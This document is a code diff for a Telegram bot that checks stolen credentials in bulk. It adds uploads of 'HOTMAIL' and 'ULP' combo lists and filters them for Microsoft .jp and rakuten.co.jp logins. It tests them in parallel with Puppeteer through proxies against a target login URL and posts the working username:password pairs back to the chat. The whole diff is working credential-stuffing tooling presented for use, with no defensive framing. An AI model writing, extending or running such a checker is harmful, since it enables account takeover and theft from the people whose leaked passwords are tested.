@@ -2,7 +2,13 @@ const { Telegraf, Markup } = require('telegraf');
 const { checkCredentials } = require('./puppeteerChecker');
 const { closeBrowserSession } = require('./automation/browserManager');
 const { captureAccountData } = require('./automation/dataCapture');
-const { prepareBatchFromFile, ALLOWED_DOMAINS } = require('./automation/batchProcessor');
+const {
+  prepareBatchFromFile,
+  prepareUlpBatch,
+  ALLOWED_DOMAINS,
+  MAX_BYTES_HOTMAIL,
+  MAX_BYTES_ULP,
+} = require('./automation/batchProcessor');
 const fs = require('fs').promises;
 
 // Track sessions kept alive after VALID outcomes for optional data capture.
@@ -10,6 +16,8 @@ const pendingSessions = new Map();
 const pendingTimeouts = new Map();
 const pendingMeta = new Map();
 const pendingBatches = new Map();
+const pendingFiles = new Map();
+const BATCH_CONCURRENCY = 3; // number of parallel workers per batch
 
 /**
  * Validates and parses the credential string format "user:pass".
@@ -37,74 +45,52 @@ function parseCredentials(credentialString) {
  * @param {string} email - Email to validate
  * @returns {boolean} True if valid email format
  */
-function isValidEmail(email) {
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  return emailRegex.test(email);
-}
+  // Handle batch file uploads: first ask type (HOTMAIL or ULP)
+  bot.on('document', async (ctx) => {
+    const doc = ctx.message && ctx.message.document;
+    if (!doc) return;
 
-/**
- * Guards input for safety and valid format.
- * @param {string} credentialString - Raw credential string
- * @returns {Object} { valid: boolean, error?: string }
- */
-function guardInput(credentialString) {
-  if (!credentialString) {
-    return { valid: false, error: 'Credential string is required.' };
-  }
+    const chatId = ctx.chat.id;
+    const sourceMessageId = ctx.message && ctx.message.message_id;
 
-  const sanitizedInput = credentialString.trim();
+    let fileUrl;
+    try {
+      const link = await ctx.telegram.getFileLink(doc.file_id);
+      fileUrl = link.href || link.toString();
+    } catch (err) {
+      await ctx.replyWithMarkdown(
+        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
+        { reply_to_message_id: doc.message_id }
+      );
+      return;
+    }
 
-  if (sanitizedInput.length > 200) {
-    return { valid: false, error: 'Credential string too long (max 200 characters).' };
-  }
+    const key = `${chatId}:${sourceMessageId}`;
+    pendingFiles.set(key, {
+      fileUrl,
+      filename: doc.file_name || 'file.txt',
+      size: doc.file_size,
+      sourceMessageId,
+    });
 
-  if (sanitizedInput.length < 5) {
-    return { valid: false, error: 'Credential string too short.' };
-  }
-
-  if (!sanitizedInput.includes('@')) {
-    return {
-      valid: false,
-      error: 'Email must include "@" symbol. Format: `.chk email@example.com:password`',
-    };
-  }
-
-  if (!sanitizedInput.includes(':')) {
-    return { valid: false, error: 'Format must be: `.chk email:password`' };
-  }
-
-  const parts = sanitizedInput.split(':');
-  if (parts.length !== 2) {
-    return { valid: false, error: 'Multiple colons detected. Use format: `email:password`' };
-  }
-
-  const creds = parseCredentials(sanitizedInput);
-  if (!creds) {
-    return { valid: false, error: 'Invalid format. Use: `.chk email:password`' };
-  }
-
-  // Validate email format
-  if (!isValidEmail(creds.username)) {
-    return { valid: false, error: 'Invalid email format. Please provide a valid email address.' };
-  }
-
-  // Validate password length
-  if (creds.password.length < 4) {
-    return { valid: false, error: 'Password too short (minimum 4 characters).' };
-  }
-
-  if (creds.password.length > 100) {
-    return { valid: false, error: 'Password too long (maximum 100 characters).' };
-  }
-
-  // Check for suspicious patterns
-  if (creds.password.includes(' ')) {
-    return { valid: false, error: 'Password contains spaces. Check your input.' };
-  }
-
-  return { valid: true };
-}
-
+    await ctx.replyWithMarkdown(
+      '📂 *File received*' +
+      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
+      `\n• Size: ${formatBytes(doc.file_size)}` +
+      '\n\nSelect file type:',
+      {
+        reply_to_message_id: sourceMessageId,
+        ...Markup.inlineKeyboard([
+          [
+            Markup.button.callback('📧 HOTMAIL', `batch_type_hotmail_${sourceMessageId}`),
+            Markup.button.callback('🗂 ULP', `batch_type_ulp_${sourceMessageId}`),
+          ],
+          [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
+        ]),
+      }
+    );
+  });
+ 
 /**
  * Formats a result object into a user-friendly Telegram message with markdown.
  * @param {Object} result - Result from checkCredentials
@@ -112,6 +98,7 @@ function guardInput(credentialString) {
  * @param {string} result.message - Status message
  * @param {string} [result.screenshot] - Optional screenshot path
  * @param {string} [username] - Username being checked (masked)
+ * @param {number} [durationMs] - Duration in milliseconds
  * @returns {string} Formatted message for Telegram
  */
 function escapeV2(text) {
@@ -127,6 +114,14 @@ function formatBytes(bytes) {
   if (!bytes || Number.isNaN(bytes)) return 'unknown';
   const mb = bytes / (1024 * 1024);
   return `${mb.toFixed(2)} MB`;
+}
+
+function formatDurationMs(ms) {
+  const seconds = ms / 1000;
+  if (seconds < 60) return `${seconds.toFixed(1)}s`;
+  const minutes = Math.floor(seconds / 60);
+  const rem = (seconds % 60).toFixed(1);
+  return `${minutes}m ${rem}s`;
 }
 
 function boldV2(text) {
@@ -180,53 +175,83 @@ async function runBatchExecution(ctx, batch, msgId, statusMsg, options, key) {
   const chatId = ctx.chat.id;
   const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
   let processed = 0;
+  const validCreds = [];
+  const startedAt = Date.now();
 
-  try {
-    for (const cred of batch.creds) {
-      let result;
-      try {
-        result = await checkCredentials(cred.username, cred.password, {
-          timeoutMs: options.timeoutMs || 60000,
-          proxy: options.proxy,
-          screenshotOn: false,
-          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
-          headless: options.headless,
-        });
-      } catch (err) {
-        result = { status: 'ERROR', message: err.message };
-      }
+  const iterator = batch.creds[Symbol.iterator]();
 
-      counts[result.status] = (counts[result.status] || 0) + 1;
-      processed += 1;
-
-      if (processed === 1 || processed === batch.count || processed % 5 === 0) {
-        const text =
-          `${escapeV2('⏳ Batch progress')}` +
-          `\nFile: ${escapeV2(batch.filename)}` +
-          `\nProcessed: *${processed}/${batch.count}*` +
-          `\n✅ VALID: *${counts.VALID || 0}*` +
-          `\n❌ INVALID: *${counts.INVALID || 0}*` +
-          `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
-          `\n⚠️ ERROR: *${counts.ERROR || 0}*`;
-
-        try {
-          await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
-            parse_mode: 'MarkdownV2',
-          });
-        } catch (err) {
-          // ignore edit failures
-        }
-      }
+  const processCredential = async (cred) => {
+    if (batch.aborted) return;
+    let result;
+    try {
+      result = await checkCredentials(cred.username, cred.password, {
+        timeoutMs: options.timeoutMs || 60000,
+        proxy: options.proxy,
+        screenshotOn: false,
+        targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
+        headless: options.headless,
+      });
+    } catch (err) {
+      result = { status: 'ERROR', message: err.message };
     }
 
+    counts[result.status] = (counts[result.status] || 0) + 1;
+    processed += 1;
+
+    if (result.status === 'VALID') {
+      validCreds.push(`• ||\`${escapeV2(cred.username)}:${escapeV2(cred.password)}\`||`);
+    }
+
+    if (batch.aborted) {
+      return;
+    }
+
+    if (processed === 1 || processed === batch.count || processed % 5 === 0) {
+      const text =
+        `${escapeV2('⏳ Batch progress')}` +
+        `\nFile: ${escapeV2(batch.filename)}` +
+        `\nProcessed: *${processed}/${batch.count}*` +
+        `\n✅ VALID: *${counts.VALID || 0}*` +
+        `\n❌ INVALID: *${counts.INVALID || 0}*` +
+        `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
+        `\n⚠️ ERROR: *${counts.ERROR || 0}*`;
+
+      try {
+        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
+          parse_mode: 'MarkdownV2',
+        });
+      } catch (err) {
+        // ignore edit failures
+      }
+    }
+  };
+
+  const worker = async () => {
+    for (;;) {
+      if (batch.aborted) return;
+      const next = iterator.next();
+      if (next.done) return;
+      await processCredential(next.value);
+    }
+  };
+
+  try {
+    const poolSize = Math.min(BATCH_CONCURRENCY, batch.creds.length);
+    await Promise.all(Array.from({ length: poolSize }, () => worker()));
+
+    const elapsed = Date.now() - startedAt;
+    const summaryTitle = batch.aborted ? '⏹️ Batch aborted' : '📊 Batch complete';
     const summary =
-      `${escapeV2('📊 Batch complete')}` +
+      `${escapeV2(summaryTitle)}` +
       `\nFile: ${escapeV2(batch.filename)}` +
       `\nTotal: *${batch.count}*` +
       `\n✅ VALID: *${counts.VALID || 0}*` +
       `\n❌ INVALID: *${counts.INVALID || 0}*` +
       `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
-      `\n⚠️ ERROR: *${counts.ERROR || 0}*`;
+      `\n⚠️ ERROR: *${counts.ERROR || 0}*` +
+      `\n🕒 Time: *${escapeV2(formatDurationMs(elapsed))}*` +
+      `\n\n${escapeV2('VALID accounts:')}` +
+      `\n${validCreds.length ? validCreds.join('\n') : escapeV2('• None')}`;
 
     try {
       await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
@@ -611,7 +636,12 @@ function initializeTelegramHandler(botToken, options = {}) {
 
       const statusMsg = await ctx.replyWithMarkdown(
         `⏳ Starting batch check for *${escapeV2(batch.filename)}*\nEntries: *${batch.count}*`,
-        { reply_to_message_id: Number(msgId) }
+        {
+          reply_to_message_id: Number(msgId),
+          ...Markup.inlineKeyboard([
+            [Markup.button.callback('⏹ Abort', `batch_abort_${msgId}`)],
+          ]),
+        }
       );
 
       // Run batch asynchronously to avoid Telegraf 90s per-update timeout.
@@ -632,6 +662,7 @@ function initializeTelegramHandler(botToken, options = {}) {
     const msgId = ctx.match[1];
     const key = `${ctx.chat.id}:${msgId}`;
     pendingBatches.delete(key);
+    pendingFiles.delete(key);
     try {
       await ctx.telegram.editMessageText(
         ctx.chat.id,
@@ -644,6 +675,172 @@ function initializeTelegramHandler(botToken, options = {}) {
       await ctx.replyWithMarkdown(
         '❎ Batch cancelled. Send a new file to try again.',
         { reply_to_message_id: Number(msgId) }
+      );
+    }
+  });
+
+  bot.action(/batch_type_hotmail_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery();
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    const file = pendingFiles.get(key);
+    if (!file) {
+      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    try {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        ctx.update.callback_query.message.message_id,
+        undefined,
+        '⏳ Processing HOTMAIL file...',
+        { parse_mode: 'Markdown' }
+      );
+    } catch (err) {
+      // ignore
+    }
+
+    let batch;
+    try {
+      batch = await prepareBatchFromFile(file.fileUrl, MAX_BYTES_HOTMAIL);
+    } catch (err) {
+      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    if (!batch.count) {
+      await ctx.replyWithMarkdown('ℹ️ No eligible Microsoft .jp credentials found.', {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    pendingFiles.delete(key);
+    pendingBatches.set(key, {
+      creds: batch.creds,
+      filename: file.filename,
+      count: batch.count,
+      sourceMessageId: Number(msgId),
+    });
+
+    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
+    await ctx.replyWithMarkdown(
+      '📂 *HOTMAIL list parsed*' +
+      `\n• Name: ${escapeV2(file.filename)}` +
+      `\n• Size: ${formatBytes(file.size)}` +
+      `\n• Eligible credentials: *${batch.count}*` +
+      '\n• Allowed domains: ' + allowedDomainsText +
+      '\n\nProceed to check them?',
+      {
+        reply_to_message_id: Number(msgId),
+        ...Markup.inlineKeyboard([
+          [
+            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
+            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
+          ],
+        ]),
+      }
+    );
+  });
+
+  bot.action(/batch_type_ulp_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery();
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    const file = pendingFiles.get(key);
+    if (!file) {
+      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    try {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        ctx.update.callback_query.message.message_id,
+        undefined,
+        '⏳ Processing ULP file (this may take a while)...',
+        { parse_mode: 'Markdown' }
+      );
+    } catch (err) {
+      // ignore
+    }
+
+    let batch;
+    try {
+      batch = await prepareUlpBatch(file.fileUrl, MAX_BYTES_ULP);
+    } catch (err) {
+      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    if (!batch.count) {
+      await ctx.replyWithMarkdown('ℹ️ No eligible Rakuten credentials found in this file.', {
+        reply_to_message_id: Number(msgId),
+      });
+      return;
+    }
+
+    pendingFiles.delete(key);
+    pendingBatches.set(key, {
+      creds: batch.creds,
+      filename: file.filename,
+      count: batch.count,
+      sourceMessageId: Number(msgId),
+    });
+
+    await ctx.replyWithMarkdown(
+      '🗂 *ULP list parsed*' +
+      `\n• Name: ${escapeV2(file.filename)}` +
+      `\n• Size: ${formatBytes(file.size)}` +
+      `\n• Eligible credentials: *${batch.count}*` +
+      '\n• Filter: lines containing `rakuten.co.jp` (deduped)' +
+      '\n\nProceed to check them?',
+      {
+        reply_to_message_id: Number(msgId),
+        ...Markup.inlineKeyboard([
+          [
+            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
+            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
+          ],
+        ]),
+      }
+    );
+  });
+
+  bot.action(/batch_abort_(.+)/, async (ctx) => {
+    await ctx.answerCbQuery('Aborting...');
+    const msgId = ctx.match[1];
+    const key = `${ctx.chat.id}:${msgId}`;
+    const batch = pendingBatches.get(key);
+    if (batch) {
+      batch.aborted = true;
+      try {
+        await ctx.telegram.editMessageText(
+          ctx.chat.id,
+          ctx.update.callback_query.message.message_id,
+          undefined,
+          '⏹ Aborting batch, please wait...',
+          {
+            parse_mode: 'Markdown',
+            ...Markup.inlineKeyboard([]),
+          }
+        );
+      } catch (err) {
+        // ignore
+      }
+    } else {
+      await ctx.replyWithMarkdown(
+        '⚠️ No active batch to abort.',
+        { reply_to_message_id: ctx.update.callback_query.message.message_id }
       );
     }
   });
